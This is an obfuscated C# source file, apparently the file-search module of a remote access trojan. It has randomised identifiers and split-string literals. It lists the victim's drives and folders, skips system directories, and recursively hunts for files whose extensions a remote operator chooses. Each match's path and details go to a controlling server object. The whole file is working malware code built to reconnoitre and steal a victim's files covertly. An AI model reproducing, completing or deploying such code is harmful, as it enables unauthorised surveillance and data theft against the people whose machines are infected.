using System;
using System.Collections.Generic;
using System.IO;

namespace sohirmnvrs;

internal class sohirmnvrsDRIVF
{
	public sohirmnvrsMCDM iserver;

	public int sohirmnvrssIndx = 0;

	public List<string> sohirmnvrsnotFilders = new List<string>();

	public List<string> sohirmnvrssFiles = new List<string>();

	public int sohirmnvrsfIndx = 0;

	public List<string> sohirmnvrsfExts = new List<string>();

	public bool sohirmnvrsreaging = false;

	public string sohirmnvrsmainPath;

	public sohirmnvrsDRIVF()
	{
		sohirmnvrsnotFilders.Add("documents and settings|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("windows|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("program files (x86)|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("$recycle.bin|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("msocache|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("recoveG3F4D|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("programdata|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("clients_data|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("program files|sohirmnvrs".Split(new char[1] { '|' })[0]);
		sohirmnvrsnotFilders.Add("system volume information|sohirmnvrs".Split(new char[1] { '|' })[0]);
	}

	public string sohirmnvrscheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (sohirmnvrsseeAccess(text2))
				{
					text = text + text2 + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public bool sohirmnvrsseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public IEnumerable<string> sohirmnvrsaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.sohirmnvrsautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (sohirmnvrsseeAccess(text) && !sohirmnvrsnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void sohirmnvrssendSearch(string path)
	{
		try
		{
			foreach (string item in sohirmnvrsaddFiles(path))
			{
				int num = item.LastIndexOf(".!sohirmnvrs".Split(new char[1] { '!' })[0]);
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (sohirmnvrsfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.sohirmnvrsCMD.sohirmnvrsfile_info(item, ret: true);
					iserver.sohirmnvrspush_data(null, "sohirmnvrs-searf=!sohirmnvrs".Split(new char[1] { '!' })[0] + item + "<FILE_AUTO<!sohirmnvrs".Split(new char[1] { '!' })[0] + text2);
				}
				if (iserver.sohirmnvrsautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string sohirmnvrslookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
		}
		return text;
	}

	public string sohirmnvrslookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public void sohirmnvrslookFiles(string tempStr)
	{
		iserver.sohirmnvrsautCnls = false;
		sohirmnvrsfExts.Clear();
		sohirmnvrssFiles.Clear();
		sohirmnvrsfIndx = 0;
		sohirmnvrssIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				sohirmnvrsfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			sohirmnvrsreaging = true;
			sohirmnvrssendSearch(array[1]);
			sohirmnvrsreaging = false;
			iserver.sohirmnvrspush_data(null, "sohirmnvrs-seard=seahing!sohirmnvrs".Split(new char[1] { '!' })[0]);
			return;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		sohirmnvrsreaging = true;
		DriveInfo[] array4 = drives;
		foreach (DriveInfo driveInfo in array4)
		{
			if (driveInfo.IsReady)
			{
				sohirmnvrssendSearch(driveInfo.Name);
			}
		}
		iserver.sohirmnvrspush_data(null, "sohirmnvrs-seard=searching!sohirmnvrs".Split(new char[1] { '!' })[0]);
		sohirmnvrsreaging = false;
	}
}
